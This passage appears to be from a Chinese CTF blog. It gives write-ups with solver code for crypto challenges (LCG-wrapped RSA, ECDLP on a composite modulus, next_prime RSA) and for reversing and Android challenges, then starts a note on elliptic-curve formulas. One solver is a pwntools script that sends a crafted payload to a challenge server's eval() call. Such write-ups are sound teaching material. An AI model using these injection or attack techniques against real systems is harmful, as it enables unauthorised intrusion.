1, t), t)] for i in range(len(flag)): r += [pow(x * r[i] +y, pow(getrandbits(k), t - 1, t), t)] return r(p, q) = genpq(2021)e = getPrime(0x0123)r = [genseq(p, p.bit_length() // 4), genseq(q, q.bit_length() // 4), genseq(e, e.bit_length() // 4)]c = pow(bytes_to_long(flag), e, 2021 * p * q)out = open(&#x27;output.txt&#x27;,&#x27;w&#x27;)out.write(str(r) + &quot;\\n&quot;)out.write(str(c) + &quot;\\n&quot;)out.close() 套LCG壳的RSA。 首先解决LCG问题， 观察 genseq() 函数，发现 pow(getrandbits(k), t - 1, t) 为混淆式，由于传入的 $t$ 为质数，可根据费马小定理化为1，再按照正常方式生成递归状态数组 $r_{i+1}=(x \\cdot r_i+y) \\pmod t$，其中乘数 $x$、增量$y$、模数$t$ 均未知。 三次调用genseq()函数，产生以 $p,q,e$ 为模数的递归状态数组 $r_p,r_q,r_e$，利用三种值未知情况下的攻击方式，求出 $p,q,e$ 值。 再解简单RSA即得flag。 123456789101112131415161718192021222324252627282930313233343536373839404142from functools import reducefrom math import gcddef egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception(&#x27;modular inverse does not exist&#x27;) else: return x % mdef crack_unknown_increment(states, modulus, multiplier): increment = (states[1] - states[0]*multiplier) % modulus return modulus, multiplier, incrementdef crack_unknown_multiplier(states, modulus): multiplier = (states[2] - states[1]) * modinv(states[1] - states[0], modulus) % modulus return crack_unknown_increment(states, modulus, multiplier)def crack_unknown_modulus(states): diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])] zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])] modulus = abs(reduce(gcd, zeroes)) return crack_unknown_multiplier(states, modulus)rp = []rq = []re = []xp, yp, p = crack_unknown_modulus(rp)xq, yq, q = crack_unknown_modulus(rq)xe, ye, e = crack_unknown_modulus(re)print(p)print(q)print(e)#RSA步骤略 ​ luckybase baseの试炼 hint: b64decode(‘452/4520’)=’㝿㝴’ 123456789101112131415161718#!/usr/bin/env python3.8from base64 import b64encodefrom random import randint, randomfrom os import getcwdprint(&#x27;\\n\\n&#x27;)print(open(getcwd() + &#x27;/&#x27; + __file__, &#x27;r&#x27;).read())print(&#x27;\\n\\n&#x27;)luck = randint(0, 2021) * random()print(luck)good = eval(b64encode(input().encode(&#x27;utf-8&#x27;)))if abs(good - luck) &lt; 1e-10: print(open(&#x27;/flag&#x27;).read())else: print(&#x27;Back luck 2021???&#x27;) 其实算半个misc题。 代码逻辑为，输入内容，使得UTF-8字符以base64编码后结果与给定的float值近似（$10^{-10}$误差内）。 base64编码的结果包含的字符有ABCDEFGHIJKLMNOPQRSVWXYZabcdeghiklmnopqrstuvxyz0123456789+/，那么可以使用数字0123456789和运算符号+或/凑出计算式来表示0.1，以及用e+数字凑出科学计数法。 由于任意浮点数都可以表示为 $\\sum\\limits_{i,j&lt;k}(d_i \\cdot 0.1\\cdot 10^{-j})$，其中 $d_i$ 表示第 $i$ 位的数字，$j$ 表示对应的指数值，如 $1.143=11 \\cdot 0.1 \\cdot 10^{0}+4 \\cdot 0.1 \\cdot 10^{-1}+3 \\cdot 0.1 \\cdot 10^{-2}$ 根据hint，$0.1$可表示为452/4520，$10^{-j}$可以表示为e+数字，系数 $d_i$ 可以变为对应的项的叠加，以 $1.143$ 为例，即 452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e01+452/4520e01+452/4520e01+452/4520e01+452/4520e02+452/4520e02+452/4520e02 接下来寻找满足base64特性（编码：每3字符→4字符，解码：每4字符→3字符）并且编解码一致的e+数字串，有： e00+对应&#123;M&gt;，e01+对应&#123;M~，e04+对应&#123;N&gt;，e05+对应&#123;N~，e08+对应&#123;O&gt;，e09+对应&#123;O~，e10+对应&#123;]&gt;，e11+对应&#123;]~，e013对应&#123;Mw。 将生成值按上面公式拆解，替换为对应特征串，nc交互： 1234567891011121314151617181920212223242526272829303132333435363738#coding=utf-8#注意py2和py3关于float值的输出长度不同，py2输出值过短会导致误差不满足要求，此用py3from pwn import *from base64 import b64encoder = remote(&#x27;111.231.70.44&#x27;, 28044)r.recvuntil(&#x27;Back luck 2021???&#x27;)r.recvline()r.recvline()r.recvline()r.recvline()num = r.recvline().strip(b&#x27;.&#x27;)print(num)num = num.split(b&#x27;.&#x27;)a = int(num[0])b = num[1].decode(&#x27;utf-8&#x27;)table = &#123;&#x27;0.1/&#x27;: &#x27;㝿㝴&#x27;, &#x27;e00+&#x27;: &#x27;&#123;M&gt;&#x27;, &#x27;e01+&#x27;: &#x27;&#123;M~&#x27;, &#x27;e04+&#x27;: &#x27;&#123;N&gt;&#x27;, &#x27;e05+&#x27;: &#x27;&#123;N~&#x27;, &#x27;e08+&#x27;: &#x27;&#123;O&gt;&#x27;, &#x27;e09+&#x27;: &#x27;&#123;O~&#x27;, &#x27;e10+&#x27;: &#x27;&#123;]&gt;&#x27;, &#x27;e11+&#x27;: &#x27;&#123;]~&#x27;, &#x27;e013&#x27;: &#x27;&#123;Mw&#x27;&#125;payload = &quot;0.1/e00+&quot;*(a*10+int(b[0]))payload += &quot;0.1/e01+&quot;*(int(b[1]))payload += &quot;0.1/e04+&quot;*(int(b[2:5]))payload += &quot;0.1/e05+&quot;*(int(b[5]))payload += &quot;0.1/e08+&quot;*(int(b[6:9]))payload += &quot;0.1/e09+&quot;*(int(b[9]))payload += &quot;0.1/e10+&quot;*(int(b[10]))payload += &quot;0.1/e11+&quot;*(int(b[11]))payload += &quot;0.1/e013&quot;data = &quot;&quot;for i in range(0, len(payload), 4): data+=table[payload[i:i+4]]print(eval(b64encode(data.encode(&#x27;utf-8&#x27;))))r.sendline(data)print(r.recvall()) 出题思路来自TSG CTF 2020 - Beginner’s Misc，此题不止一种方法，欢迎分享其他做法。 ​ eccsimiscce 初探ecc。Be patient! hint: 注意看一下题目名字 123456789101112131415161718192021222324252627282930from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytesfrom random import getrandbitsfrom secret import flagdef gen(n): g = [] while len(g) &lt; 2: r = getrandbits(128) if r &lt; n: g += [r] return g[0], g[1]pt = b&#x27;\\x00&#x27; * 6 + long_to_bytes(int(flag,2))assert len(pt) % 8 == 0o = open(&#x27;output&#x27;,&#x27;w&#x27;)n = getPrime(64) * getPrime(64)o.write(str(n) + &#x27;\\n&#x27;)a, b = gen(n)p = []E = EllipticCurve(IntegerModRing(n), [a, b^2])P = E((0, b))p += [P.xy()]for k in range(len(pt) // 8): Q = bytes_to_long(pt[8 * k : 8 * k + 8]) * P p += [Q.xy()] P = Q o.write(str(p)) 简单ECDLP（椭圆曲线离散对数问题）。 将flag二进制值对应字符串在前面补充6个&#39;\\x00&#39;后，以8个字节一组通过ECC倍乘加密，得到的点 $Q$ 再作为下一组的基点 $P$ 继续倍乘，以此类推。 依次对每一组求解ECDLP问题，即给定2个素数 $p,q$ 的乘积 $n=pq$，已知生成元 $P$ 和积 $Q=m_iP$，求 $m_i$。 $n$ 是一个合数，根据Elliptic Curve Discrete Log in a Composite Ring，可以将其分解成模 $p$ 和模 $q$ 上的两条曲线，然后再在这两条曲线上分别求解DLP，最后通过CRT算法即可得到模 $n$ 下的解。 由于DLP的运行时长取决于ECC的光滑度，且由输出的点列表知有211个8字节串，总运行时间会比较长（Be patient）。 解出所有8字节串，连接发现是很长的01串，结合hint发现题目eccsi[misc]ce里含有misc，且$(211 \\cdot 8-6)\\cdot8=13456=(2^2\\cdot29)^2$ 为完全平方数，猜测为二维码，将01串转化为图片扫码得flag。 1234567891011121314151617181920212223242526272829303132#sagen=point=[]x1,y1=point[0]x2,y2=point[1]a=(((y2^2-y1^2)-(x2^3-x1^3))%n*inverse_mod(x2-x1,n))%nb=y1#factor(n)p=12117702104890171579q=16627969210850438723flag01=&#x27;&#x27;for i in range(1,len(point)): print(i-1,i) G=point[i-1] K=point[i] Ep=EllipticCurve(GF(p),[a,b^2]) Eq=EllipticCurve(GF(q),[a,b^2]) xp=discrete_log(Ep(K),Ep(G),operation=&#x27;+&#x27;) xq=discrete_log(Eq(K),Eq(G),operation=&#x27;+&#x27;) x=crt([ZZ(xp),ZZ(xq)],[ZZ(Ep(K).order()),ZZ(Eq(K).order())]) m=bin(x)[2:].rjust(64,&#x27;0&#x27;) print(m) flag01+=m print(flag01)#01串转图片略 ​ 大佬们帮我看看我这个Python脚本为什么运行不了啊 菜鸡 9:36:27菜鸡上传了文件 新建文本文档.py 菜鸡 9:37:02key1: Do you want a DaJiBei? 菜鸡 9:37:61大佬们帮我看看我这个Python脚本为什么运行不了啊 hint1: 最终结果是自带flag格式的，可以据此判断结果是否正确，不必浪费时间尝试提交格式 hint2: 为什么运行结果里好好的3，也要写成大小写混乱的样子？ hint3: 如果某个方向已经找不到更多的线索，不妨回头看看来时的道路 hint4: 本题的加密方式来源于对以下问题的思考：如何在同一个载体上加密两段信息，且读取其中一种信息的过程会令另一种信息被破坏；并且，如果前一种信息的读取方式足够显而易见，是否可以在有限的短时间内尽可能转移注意力，减少非预期接收者发现另一段信息的可能性？为了降低难度，本题在选择每一种信息的加密方式时，尽可能选择了复杂度较低的做法；同时，将其中一段信息（相信大家都已经找到这一段了）设计为另一段信息加密方式的提示。 hint5: 3对应...-- 1234567891011121314fROM CRYPTO.utIL.NuMBER IMPORT BYteS_TO_LoNG, long_TO_BYTESA_Fake_FLaG = B&#x27;FLag&#123;I_AM_the_TRUE_Flag_trUST_me&#125;&#x27;nuMBER = bYTEs_tO_long(a_FAKE_FLAG)KeY1 = B&#x27;DO yOU WAnT A DAJIBEI?&#x27;KEY1 = Bytes_to_lONG(KEY1)KEY2 = 0XBCD2deE7E7114B5C856F8DAECeD0782BD891200B4D8264D854A13D53cF1F0c481biv = 10800KEY3 = KeY2 * IVIS_THIS_rEAL_FlAG = (NUmber + kEY3) // KEy1print(long_tO_bytes(IS_THis_REAl_flag)) 新颖的题目设计，将真正信息藏于易读信息里，视觉第一影响大脑，接收先入信息以减少其他信息被注意的可能，有种首因效应的意味。 根据题面知真正的key1=&#39;Do you want a DaJiBei?&#39;，修正除&#39;FLag&#123;I_AM_the_TRUE_Flag_trUST_me&#125;&#39;外的字母大小写，运行脚本得到输出结果为thrEE_means_3，结合hint5知应该是摩斯密码，赛时连蒙带猜猜中flag，下来询问出题者@cheyenne预期解为，将代码全文大小写分别转换为.和-后解密得flag。 ​ 单表加密 替换式密码，又名取代加密法，是密码学中按规律将文字加密的一种方式。替换式密码仅对明文中字符组成的单元进行替换，但密文中单元的位置没有改变。如果每一个字符为一单元进行加密操作，就称之为“简易替换密码”或“单表加密”。一种单表加密的做法是事先约定一份文本作为密码本，并根据文本内容和特征对明文进行替换加密。由于密码本仅提供给非常重要的人士，在一定程度上增加了密码的安全性。据称，在我国古代，苏州一带的当铺曾经大量使用此类密码。注意：古代苏州当铺的伙计不认识拉丁字母、阿拉伯数字和标点符号，所以当时的密码本仅使用汉字 hint1: 做题时不要老是上外部网站。 hint2: 密码本可能会在2月10日进行一次较大的更新。 hint3: 想一想，那个把数字加密成汉字的替换密码的实质是什么？ hint4: 密码本：请点击页面最上方的VIP 苏州码子+ctfshow vip页密码本+当铺密码。 第一步，将word中苏州码子替换为数字。 第二步，到https://vip.ctf.show/，将上一步每行数字按照`模块数+行数+第几个字`方式取出对应的字。 第三步，数每个汉字有多少笔画出头，就是转化成16进制的数字几。 最后得到的16进制串转字符串即为flag。 12345678910111213141516dic=&#123;&#x27;11&#x27;:&#x27;什么是会员&#x27;,&#x27;12&#x27;:&#x27;平台自开通以来凭借着众多优秀的原创题目与活跃和谐的社区环境受到了广大的一致好评但是近几&#x27;,&#x27;21&#x27;:&#x27;会员有什么特权&#x27;,&#x27;22&#x27;:&#x27;会员目前针对平台入门系列题目开通会员后可以解锁全部道题目同时由平台技术&#x27;,&#x27;41&#x27;:&#x27;题目有哪些内容&#x27;,&#x27;42&#x27;:&#x27;入门系列题目采用循序渐进的方式逐步开放题栈如下&#x27;,&#x27;61&#x27;:&#x27;会员开通价格&#x27;,&#x27;62&#x27;:&#x27;平台题目绝大部分都是原创题目出题师傅们付出了辛勤的劳动考虑到学习的大部分还是以学生为主&#x27;,&#x27;71&#x27;:&#x27;会员价格元还是感觉贵了怎么办&#x27;,&#x27;72&#x27;:&#x27;这个确实还是个问题所以笔者建议经济实力不够的同学可以联系两三个好友合买一个号目前支付宝支持分期和花呗&#x27;,&#x27;81&#x27;:&#x27;如何支付开通会员&#x27;&#125;x=[613,613,613,225,613,2231,613,6239,6239,7235,4223,723,421,4223,613,6224,813,2222,4223,225,421,2231,813,2222,4223,4223,813,813,813,2222,4223,6239,6239,813,421,1219,813,2222,4223,6239,613,2231,4223,2222,6239,7249]word=&#x27;&#x27;for k in x: s=str(k) key=s[:2] index=int(s[2:]) print(index) word+=dic[key][index-1] print(word)#开开开针开由开以以买下确入下开勤支解下针入由支解下下支支支解下以以支入目支解下以开由下解以花#666c61677b48346e5f4c315f44555f4775305f47614f7d ​ RealSimpleAlgorithm So real, so simple… 123456789101112131415161718from Crypto.Util.number import *from secret import flagdef findPrime(k): return k if isPrime(k) else findPrime(k+1) p = getPrime(256)q = findPrime(20210123 * p * p)r = findPrime(p * q * q)s = findPrime(p * q * r)n = p * q * r * se = 0x10001m = bytes_to_long(flag)w = open(&#x27;output&#x27;,&#x27;wb&#x27;)w.write(long_to_bytes(n))w.write(b&#x27;\\n\\n&#x27;)w.write(long_to_bytes(pow(m, e, n))) RSA签到题，考察next_prime特性。 根据素数定理，素数的平均间隔为：$\\cfrac{x}{\\pi(x)} \\approx \\ln(x)$，因此常见的下一个素数比当前素数大一点，一般不会超过1500。 由于素数间隔不会超1500，故： $q\\approx 20210123 \\cdot p^2$ $r\\approx p \\cdot q^2 \\approx 20210123^2 \\cdot p^5$ $s \\approx p \\cdot q \\cdot r \\approx 20210123^3 \\cdot p^8$ $n \\approx p \\cdot q \\cdot r \\cdot s \\approx 20210123^6 \\cdot p^{16}$ 以开方取整得到的值开始爆破 $p$ ，再分别求出对应的 $q,r,s$，基本RSA操作即可得到flag。 12345678910111213141516171819202122232425262728293031import gmpy2n=c=def cal(p): q=gmpy2.next_prime(20210123*p*p) r=gmpy2.next_prime(p*q*q) s=gmpy2.next_prime(p*q*r) return p*q*r*s def findp(p,n): print(p) while 1: nx=cal(p) if nx&lt;n: p=gmpy2.next_prime(p+1) else: return p #n ~ (20210123**6)*(p**16)approx=gmpy2.iroot(n//pow(20210123,6),16)[0]p=findp(approx,n)print(p)q=gmpy2.next_prime(20210123*p*p)r=gmpy2.next_prime(p*q*q)s=gmpy2.next_prime(p*q*r)phi=(p-1)*(q-1)*(r-1)*(s-1)d=gmpy2.invert(0x10001,phi)m=pow(c,d,n)print(bytes.fromhex(hex(m)[2:])) ​ REVERSEA-Maze-In 真·签到 迷宫题。 注意函数sub_4011B0()： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596int sub_4011B0()&#123; char x; // bl@1 unsigned __int8 j; // dl@1 signed int i; // esi@2 char c; // al@3 int len; // ecx@4 unsigned int v5; // esi@19 char flag[256]; // [sp+8h] [bp-230h]@1 char input[256]; // [sp+108h] [bp-130h]@1 int data; // [sp+208h] [bp-30h]@1 int v10; // [sp+20Ch] [bp-2Ch]@1 int v11; // [sp+210h] [bp-28h]@1 int v12; // [sp+214h] [bp-24h]@1 int v13; // [sp+218h] [bp-20h]@1 int v14; // [sp+21Ch] [bp-1Ch]@1 int v15; // [sp+220h] [bp-18h]@1 int v16; // [sp+224h] [bp-14h]@1 int v17; // [sp+228h] [bp-10h]@1 int v18; // [sp+22Ch] [bp-Ch]@1 int v19; // [sp+230h] [bp-8h]@1 data = -1341248919; v10 = 1078449436; v11 = -404433706; v12 = 2107721006; v13 = 310654741; v14 = 466487083; v15 = 244438942; v16 = -1045521021; v17 = -1205263960; v18 = 136611182; v19 = 31438528; memset(flag, 0, 0x100u); memset(input, 0, 0x100u); printf_(&quot;Do you wanna play a game?\\n&quot;); printf_(&quot;Let&#x27;s play escape game where you have to find a way out. Please enter your way:&quot;); sub_401050(&quot;%s&quot;, input, 256); x = 3; j = 0; if ( strlen(input) != 34 ) goto _Failed; i = 0; do &#123; c = input[i]; switch ( c ) &#123; case &#x27;U&#x27;: len = j; if ( byte_404018[4 * (x + 8 * j)] != 1 ) goto _Failed; --j; break; case &#x27;D&#x27;: len = j; if ( byte_404019[4 * (x + 8 * j)] != 1 ) goto _Failed; ++j; break; case &#x27;L&#x27;: len = j; if ( byte_40401A[4 * (x + 8 * j)] != 1 ) goto _Failed; --x; break; default: if ( c != &#x27;R&#x27; ) goto _Failed; len = j; if ( byte_40401B[4 * (x + 8 * j)] != 1 ) goto _Failed; ++x; break; &#125; ++i; &#125; while ( i &lt; 34 ); if ( x != 4 || j != 7 ) &#123;_Failed: printf_(&quot;You&#x27;re stuck!\\n&quot;); return 0; &#125; if ( decrypt((int)flag, (int)&amp;data, len, (int)input) == -1 ) return 0; printf_(&quot;Escaped! You see the flag\\n&quot;); v5 = 0; do &#123; Sleep(0xC8u); printf_(&quot;%c&quot;, flag[v5++]); &#125; while ( v5 &lt;= 44 ); return 0;&#125; 信息： 迷宫起点(3,0)，终点(4,7)，大小8*8，只允许四个方向键-上(U)下(D)左(L)右(R)，每个格子由代表4个方向的4个字节构成，1表示对应方向通，0表示对应方向不通，最大步数为34，求路径。 在0x404018处可以导出迷宫数据： 1234567891011121314151600 01 00 01 00 01 01 01 00 00 01 01 01 00 01 0100 01 01 00 00 01 00 01 00 01 01 00 00 01 00 0001 00 00 00 01 00 00 01 00 00 01 01 00 01 01 0001 01 00 00 01 00 00 00 01 01 00 00 01 01 00 0000 01 00 01 00 00 01 01 00 00 01 01 01 00 01 0001 00 00 01 00 01 01 00 01 00 00 01 01 01 01 0001 00 00 01 00 01 01 00 00 01 00 01 00 00 01 0100 01 01 00 01 01 00 00 00 01 00 01 01 00 01 0000 01 00 01 01 00 01 00 01 00 00 01 00 01 01 0001 01 00 00 01 01 00 00 01 00 00 01 00 01 01 0001 01 00 00 00 01 00 01 00 00 01 01 01 00 01 0001 01 00 00 01 01 00 00 00 01 00 01 01 00 01 0001 01 00 00 01 00 00 01 00 01 01 00 00 01 00 0101 00 01 00 01 01 00 00 01 00 00 01 00 01 01 0001 00 00 01 00 00 01 01 01 00 01 00 01 00 00 0100 01 01 00 01 00 00 01 00 00 01 01 01 00 01 00 可在纸上复现迷宫，正常走出路径，nc提交得flag。 ​ Matara Okina https://ctfshow.lanzous.com/i4PQEkn6vch apk分析。 jadx逆向分析源码，找到FlagActivity，根据结果字符串@lgvjocWzihodmXov[EWO和算法逆出原始字符串： 1234567891011121314151617181920ans=b&#x27;@lgvjocWzihodmXov[EWO&#x27;ans=list(ans)secret=[0]*21i=0while i&lt;len(secret)//2: j=i+1 secret[i]^=j x=len(secret)-1-i secret[x]^=j i=j for i in range(10): secret[i]=ans[i]^(i+1) secret[20-i]=ans[20-i]^(i+1) secret[10]=ans[10]print(bytes(secret))#Android_scheme_is_FUN 得到的只是secret部分，需提交data， 注意到paramBundle=getIntent().getData()且paramBundle具有getScheme()和getHost()方法，了解知为Android业务组件URL Scheme，到AndroidManifest.xml中查看，发现 &lt;data android:host=&quot;p4th&quot; android:path=&quot;/70/1nput android:scheme=&quot;sh0w&quot;&gt; 构造出链接&lt;a href=&quot;sh0w://p4th/70/1nput?secret=Android_scheme_is_FUN&quot;&gt;打开APP&lt;/a&gt;，调试出flag。 ​ warmupIDA分析，输入flag长度为48，再把byte_40A0数组中的0xFF依次替换为48个值，最后16×16矩阵检测每行、每列以及每个4×4块是否满足0-15共16个值。 原始byte_40A0数组： 1234567891011121314151608 0E FF 0C 09 0D FF 01 0A 0F 03 0B 00 02 FF 0401 06 03 02 05 0A 07 00 08 09 FF 04 0F 0E 0B 0D0A 00 FF 0D 04 0F 03 0B 07 05 0E 02 06 08 0C 0104 0B 05 0F FF 02 FF 0C 06 0D 01 00 FF 0A 03 0902 0A FF 03 0D 00 0B 05 0C FF 09 01 FF 0F 07 0E0D 07 0C 0B 0F 0E 0A 08 00 FF 05 03 09 06 01 02FF 01 0F FF 0C 09 04 06 02 0E 0D FF FF 03 0A FF09 04 06 0E 02 07 01 03 0B 08 0A 0F 05 FF 00 0CFF 03 0A 07 0E 08 0C 04 09 FF 00 0D 02 FF 06 FF0C 09 01 FF 0B 03 0F 0D 0E 0A FF FF 08 00 04 0706 0D 00 08 0A 01 02 FF FF 07 04 05 0C 0B FF 0F0B 02 0E FF 00 FF 05 FF 0F 01 FF 0C 0A 09 0D 03FF 0F 0B FF 03 0C FF 0E 05 FF FF 09 FF 04 08 0A0E 08 FF FF 07 05 0D 0F 04 03 FF FF 01 0C 09 00FF 05 0D 09 06 04 08 0A 01 0C 0F 0E FF 07 02 0B03 FF 04 0A FF 0B 09 02 0D 00 FF 08 0E FF 0F 06 从前面代码逻辑推测为十六宫格填充，0xFF为需要填充的数字，填入后逐个取出即为flag。 利用excel，填充结果： 逐个取出： 12345678910111213x =[7, 6, 5, 12, 9, 8, 14, 7, 8, 6, 4, 4, 5, 0, 7, 11, 8, 13, 15, 11, 1, 5, 5, 2, 6, 9, 3, 14, 4, 6, 7, 8, 7, 1, 0, 2, 6, 13, 2, 6, 11, 10, 0, 3, 12, 1, 7, 5]flag=&#x27;&#x27;for k in x: if k+48&gt;47 and k+48&lt;=57: flag+=chr(k+48) elif k+87&gt;96 and k+87&lt;=102: flag+=chr(k+87) else: flag+=&#x27;?&#x27; print(flag)","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"曲线","slug":"crypto-曲线","date":"2021-01-20T12:17:07.000Z","updated":"2022-12-05T15:44:00.498Z","comments":true,"path":"2021/01/20/crypto-曲线/","link":"","permalink":"https://lazzzaro.github.io/2021/01/20/crypto-%E6%9B%B2%E7%BA%BF/","excerpt":"","text":"​ 数据库： https://www.hyperelliptic.org/EFD/ https://safecurves.cr.yp.to/equation.html ​ 常见曲线Edwards Curves一般方程： $x^2+y^2=c^2(1+dx^2y^2)$ 变换：$\\big(\\cfrac{X}{c}\\big)^2+\\big(\\cfrac{Y}{c}\\big)^2=1+Dc^4\\big(\\cfrac{X}{c}\\big)^2\\big(\\cfrac{Y}{c}\\big)^2 \\Rightarrow X^2+Y^2=1+DX^2Y^2$ 加法： $(x_1,y_1)+(x_2,y_2)=(\\cfrac{x_1y_2+y_1x_2}{c(1+dx_1x_2y_1y_2)},\\cfrac{y_1y_2-x_1x_2}{c(1-dx_1x_2y_1y_2)})$ 倍乘： $2(x_1,y_1)=(\\cfrac{2x_1y_1}{c(1+dx_1^2y_1^2)},\\cfrac{y_1^2-x_1^2}{c(1-dx_1^2y_1^2)})$ 取反： $-(x_1,y_1)=(-x_1,y_1)$ 映射： $x^2+y^2=1+dx^2y^2 \\longmapsto Bv^2=u^3+Au^2+u$ 其中： $u=\\cfrac{1+y}{1-y},v=\\cfrac{2(1+y)}{x(1-y)}=\\cfrac{2u}{x}$ $A=\\cfrac{4}{1-d}-2,B=\\cfrac{1}{1-d}$ 参考： https://safecurves.cr.yp.to/equation.html Crypto CTF 2021 - RoHaLd ​ Twisted Edwards Curves一般方程： $ax^2+y^2=c^2(1+dx^2y^2)$ 变换：$a\\big(\\cfrac{X}{c}\\big)^2+\\big(\\cfrac{Y}{c}\\big)^2=1+Dc^4\\big(\\cfrac{X}{c}\\big)^2\\big(\\cfrac{Y}{c}\\big)^2 \\Rightarrow AX^2+Y^2=1+DX^2Y^2$ 加法： $(x_1,y_1)+(x_2,y_2)=(\\cfrac{x_1y_2+y_1x_2}{1+dx_1x_2y_1y_2},\\cfrac{y_1y_2-ax_1x_2}{1-dx_1x_2y_1y_2})$ 倍乘： $2(x_1,y_1)=(\\cfrac{2x_1y_1}{1+dx_1^2y_1^2},\\cfrac{y_1^2-ax_1^2}{1-dx_1^2y_1^2})$ 取反： $-(x_1,y_1)=(-x_1,y_1)$ 映射： $ax^2+y^2=1+dx^2y^2 \\longmapsto Bv^2=u^3+Au^2+u$ 其中： $u=\\cfrac{1+y}{1-y},v=\\cfrac{1+y}{x(1-y)}=\\cfrac{u}{x}$ $A=\\cfrac{2(a+d)}{a-d},B=\\cfrac{4}{a-d}$ 参考： Twisted Edwards Curves NCTF 2022 - superecc ​ Binary Edwards Curves一般方程： $d_1(x+y)+d_2(x^2+y^2)=(x+x^2)(y+y^2)$ 加法： $(x_1,y_1)+(x_2,y_2)=(\\cfrac{d_1(x_1+x_2)+d_2(x_1+y_1)(x_2+y_2)+(x_1+x_1^2)[x_2(y_1+y_2+1)+y_1y_2]}{d_1+(x_1+x_1^2)(x_2+y_2)},\\cfrac{d_1(y_1+y_2)+d_2(x_1+y_1)(x_2+y_2)+(y_1+y_1^2)[y_2(x_1+x_2+1)+x_1x_2]}{d_1+(y_1+y_1^2)(x_2+y_2)})$ 倍乘： $2(x_1,y_1)=(\\cfrac{2d_1x_1+d_2(x_1+y_1)^2+(x_1+x_1^2)[x_1(2y_1+1)+y_1^2]}{d_1+(x_1+x_1^2)(x_1+y_1)},\\cfrac{2d_1y_1+d_2(x_1+y_1)^2+(y_1+y_1^2)[y_1(2x_1+1)+x_1^2]}{d_1+(y_1+y_1^2)(x_1+y_1)})$ 取反： $-(x_1,y_1)=(y_1,x_1)$ 映射： $v^2+uv=u^3+(d_1^2+d_2)u^2+d_1^4(d_1^4+d_1^2+d_2^2)$ 其中 $u=\\cfrac{d_1(d_1^2+d_1+d_2)(x+y)}{xy+d_1(x+y)}$ $v=d_1(d_1^2+d_1+d_2)(\\cfrac{x}{xy+d_1(x+y)}+d_1+1)$ 参考： Binary Edwards Curves ​ 模板类12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788# Sage# y^2 = ax^2 - bx (mod p)from Crypto.Util.number import inverse, bytes_to_long, long_to_bytesfrom sage.groups.generic import bsgsfrom hashlib import md5class SpecialCurve: def __init__(self, p, a, b): self.p = p self.a = a self.b = b def __str__(self): return f&#x27;SpecialCurve(&#123;self.p&#125;,&#123;self.a&#125;,&#123;self.b&#125;)&#x27; def __call__(self, x, y): return SpecialCurvePoint(self.p, self.a, self.b, x, y) def __contains__(self, other): x, y = other.x, other.y return (self.a * x ** 2 - self.b * x - y ** 2) % self.p == 0class SpecialCurvePoint: def __init__(self, p, a, b, x, y): self.p = p self.a = a self.b = b self.x = x % p self.y = y % p def __str__(self): return &quot;(%d, %d)&quot; % (self.x, self.y) def __repr__(self): return str(self) def __add__(self, P1): x1, y1 = self.x, self.y x2, y2 = P1.x, P1.y if x1 == 0: return P1 elif x2 == 0: return self elif x1 == x2 and (y1+y2) % self.p == 0: return SpecialCurvePoint(self.p, self.a, self.b, 0, 0) if self == P1: t = (2*self.a*x1-self.b)*inverse(2*y1, self.p) % self.p else: t = (y2-y1)*inverse(x2-x1, self.p) % self.p x3 = self.b*inverse(self.a-t**2, self.p) % self.p y3 = x3*t % self.p return SpecialCurvePoint(self.p, self.a, self.b, x3, y3) def __mul__(self, k): assert k &gt;= 0 Q = SpecialCurvePoint(self.p, self.a, self.b, 0, 0) P = SpecialCurvePoint(self.p, self.a, self.b, self.x, self.y) cnt = 0 now = 1 while k &gt; 0: if k % 2: k -= 1 Q = P + Q cnt += now else: k //= 2 P = P + P now *= 2 return Q def order(self): return self.p + 1 def is_zero(self): return self.x == 0 and self.other == 0 def __eq__(self, other): return self.a == other.a and self.b == other.b and self.p == other.p and self.x == other.x and self.y == other.y def __hash__(self): return int(md5((&quot;%d-%d-%d-%d-%d&quot; % (self.p, self.a, self.b, self.x, self.y)).encode()).hexdigest(), 16)def invert(P): return SpecialCurvePoint(P.p, P.a, P.b, P.x, -P.y % P.p)def add(P1, P2): return P1 + P2 ​ 常用算法大步小步算法（BSGS算法）计算离散对数，套用sagemath中自带的bsgs。 sage自带的bsgs算法有bug，文件 /opt/sagemath-9.3/local/lib/python3.7/site-packages/sage/groups/generic.py 中468行没写全，这导致bsgs自定义群的计算报错，解决方案就是把这一行参数补全即可。 c = op(inverse(b), multiple(a, lb, operation=operation, identity=identity, inverse=inverse, op=op)) 123456789101112131415curve =G =Q =p = E = curve(0, 0)order = p + 1factors = [..]ans = []for factor in factors: this = bsgs(G * (order // factor), Q * (order // factor), (0, factor), operation=&#x27;other&#x27;, op=add, inverse=invert, identity=E) ans.append(this) print(this)k = crt(ans, factors) ​ Pohlig-Hellman算法适用情况：曲线的阶光滑。 有些时候，尽管BSGS能够将复杂度降至 $\\sqrt{p}$，但是这个数依然很大，所以不能用。这时可以考虑Pohlig-hellman方法能不能起作用。 1234567891011121314151617181920212223242526272829303132def bsgs(g, y, p): m = int(ceil(sqrt(p - 1))) S = &#123;&#125; point = (u,0) for i in range(m): point = point + g pointg = point[0] &lt;&lt; 800 | point[1] S[pointg] = i gs = m * g for i in range(m): pointy = y[0] &lt;&lt; 800 | y[1] if pointy in S: return S[pointy] - i * m + 1 y = y + gs return Nonedef Pohlig_Hellman(G,P): ea = [] na = [] for i in range(len(fac)): c = fac[i] n = (p - 1) // c gi = n * G yi = n * P ei = bsgs(gi,yi,c) ea.append(ei%c) na.append(c) ee = crt(ea,na) return eee = Pohlig_Hellman(G,P) ​ 其他映射Montgomery型 -&gt; 